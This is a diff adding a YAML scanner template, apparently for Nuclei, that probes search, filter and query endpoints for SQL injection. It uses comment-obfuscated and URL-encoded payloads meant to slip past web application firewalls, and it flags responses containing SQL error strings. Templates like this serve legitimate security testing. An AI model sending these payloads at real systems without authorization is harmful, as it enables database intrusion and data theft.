@@ -1,0 +1,45 @@
+id: sqli-p3
+
+info:
+  name: SQL Injection - Comment and Encoding Bypass
+  author: custom
+  severity: high
+  description: SQL injection using comment obfuscation and URL encoding
+  tags: sqli,waf-bypass,obfuscation,injection
+
+http:
+  - raw:
+      - |
+        GET /{{path}}?id={{payload}} HTTP/1.1
+        Host: {{Hostname}}
+        
+      - |
+        POST /{{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        id={{payload}}
+
+    payloads:
+      payload:
+        - "'/*%00*/OR/*%00*/1=1"
+        - "'+OR+1=1"
+        - "%27%20OR%201%3D1"
+        - "/*!50000SELECT*/ * FROM users"
+        - "/*!12345SELECT*/ 1,2,3"
+        - "UN/**/ION SE/**/LECT"
+        - "+OR+1=1+let+x=1"
+      path:
+        - "search"
+        - "filter"
+        - "query"
+
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "error"
+          - "mysql"
+          - "SQL"
+        condition: or
